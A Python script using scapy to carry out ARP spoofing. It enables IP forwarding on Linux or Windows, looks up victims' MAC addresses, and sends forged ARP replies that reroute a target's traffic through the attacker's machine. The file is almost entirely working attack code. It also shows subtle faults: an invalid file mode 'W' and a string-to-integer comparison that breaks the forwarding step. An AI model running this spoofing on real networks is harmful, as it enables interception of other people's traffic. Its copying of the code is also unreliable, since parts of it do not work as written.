from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys



## for linux distro users
def _enable_linux_iproute():

    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return

    with open(file_path, "W") as f:
        print(1, file=f)


## for windows users 
def _enable_windows_iproute():
    from services import WService
    service = WService("RemoteAccess")
    service.start()


## function below enables IP routing in all platforms
def enable_ip_route(verbose=True):
    if verbose:
        print("[!] Enabling IP Routing...")
    
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")


## utility func allows to get MAC address from the machine

def get_mac(ip):
    # returns MAC address of any devive connected on the network
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, verbose=0)
    if ans:
        return ans[0][1].src


## spoofing 
def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')

    send(arp_response, verbose=0)

    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))